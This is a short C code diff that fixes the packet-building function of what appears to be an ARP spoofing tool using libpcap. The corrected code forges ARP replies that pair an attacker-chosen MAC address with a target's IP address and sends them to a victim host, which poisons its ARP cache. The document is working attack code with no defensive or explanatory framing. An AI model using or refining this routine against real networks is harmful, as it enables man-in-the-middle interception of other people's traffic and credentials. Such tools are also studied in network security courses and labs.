@@ -82,13 +82,13 @@ void getHWaddr(pcap_t *handle, struct Address *target, struct Address *sender) {
 
 void sendARP(pcap_t *handle, struct spoofTarget *s, struct Address *fake) {
 	struct ARPPacket packet;
-	memcpy(packet.MAC_source, s->sender.MAC, 6);
-	memcpy(packet.MAC_destin, s->target.MAC, 6);
+	memcpy(packet.MAC_source, fake->MAC, 6);
+	memcpy(packet.MAC_destin, s->sender.MAC, 6);
 	packet.operation = htons(2);
-	memcpy(packet.hwAddr_source, s->sender.MAC, 6);
-	memcpy(packet.hwAddr_destin, s->target.MAC, 6);
-	memcpy(packet.ptAddr_source, fake->IP, 4);
+	memcpy(packet.hwAddr_source, fake->MAC, 6);
+	memcpy(packet.hwAddr_destin, s->sender.MAC, 6);
 	memcpy(packet.ptAddr_source, s->target.IP, 4);
+	memcpy(packet.ptAddr_destin, s->sender.IP, 4);
 
 	pcap_sendpacket(handle, (u_char *)&packet, sizeof(packet));
 }
